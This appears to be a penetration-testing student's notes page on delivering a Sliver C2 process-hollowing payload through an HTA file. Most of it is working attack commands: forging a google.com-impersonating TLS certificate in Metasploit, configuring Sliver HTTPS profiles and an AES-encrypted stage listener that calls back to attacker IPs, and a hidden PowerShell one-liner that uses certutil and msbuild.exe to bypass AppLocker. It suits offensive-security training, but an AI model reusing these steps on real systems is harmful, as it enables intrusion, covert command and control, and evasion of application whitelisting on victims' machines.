# Overview
The payload is specific to the Process Hollowing payload that works with the https sliver profile
Run the powershell encoder to convert the sliver.ps1 to usable format for the hta powershell code runner within hta file

### Modify the runner.xml
Modify the runner.xml and change the IP address and runner.ps1 (or .txt) which will be the shell code runner, reference the PEN-300/sliver folder for simple shell code runner .ps1

### Encoding
The xml requires base64 encoding and placed into the runner.hta file within the powershell command to execute the mshta file.

{% code overflow="wrap" %}
```bash
PS Z:\ToolLibrary\AppLocker-CLM\HTA\Sliver-AdvancedHTTPs-HTA-Loader> .\HTA-powershellEncoder.ps1
```
{% endcode %}

Copy and paste the output from the encoded.txt file into the runner.hta file.

## References
Sliver staged payload: ToolLibrary/Sliver-Setup-HTTPS/sliver.ps1
XML Payload: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader/runner.xml
HTA Template: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader/runner.hta

## Sliver Setup
```bash
# impersonate_ssl for crt/key creation for encrypted https traffic
msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set RHOST www.google.com; run; exit"

#Then save the .crt and .key files into an appropriate folder for easy reference

# Create profile local64 and point to port 443
sliver > profiles new --http 192.145.227.43:443 --format shellcode local64

# Setup main listener with google.crt / key generated with metasploit
sliver > sliver > https -L 192.168.45.227 -l 443 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key

# Setup the main stager with .crt and .key
sliver > stage-listener --url https://192.168.45.227:8064 --profile local64 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

## Prepare Sliver Payload
```bash
# payload for the https stager can be found in ToolLibrary/Sliver-Setup-HTTPS/sliver.ps1
```

## Prepare HTA XML runner 
```bash
# Update the runner.xml with the URI that corresponds to kali hosted webserver

# Encode the runner.xml into base64 and outputs contents into encoded.txt 
┌──(kali㉿kali)-[~]
└─$ pwsh ./HTA-powershellEncoder.ps1

# Copy contents into runner.hta 
powershell -windowstyle hidden echo <insert here> > c:\\windows\\temp\\enc.txt;certutil -decode c:\\windows\\temp\\enc.txt c:\\windows\\temp\\a.xml;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe C:\\windows\\temp\\a.xml
```
